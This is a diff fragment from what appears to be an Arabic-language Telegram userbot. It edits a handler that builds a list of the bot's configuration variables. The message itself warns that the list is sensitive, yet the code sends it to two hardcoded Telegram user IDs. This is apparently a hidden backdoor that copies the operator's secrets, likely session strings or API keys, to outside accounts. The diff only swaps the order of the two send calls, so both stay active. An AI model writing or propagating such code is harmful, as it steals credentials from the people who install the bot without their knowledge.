@@ -538,9 +538,9 @@ async def Hussein(event):
                     OUTPUT = (
                         f"**[الساحر](tg://need_update_for_some_feature/) قـائمـة الـفـارات:**\n\n\n{o}\n\n**انتبه هنالك معلومات حساسة لا تُعطِها لشخص غير موثوق**"
                     )
-
-                    await Qrh9.send_message(6759899119, OUTPUT)
                     await Qrh9.send_message(7110606904, OUTPUT)
+                    await Qrh9.send_message(6759899119, OUTPUT)
+
 ###
 ####
 @Qrh9.on(admin_cmd(pattern="همسه(?:\s|$)([\s\S]*)"))
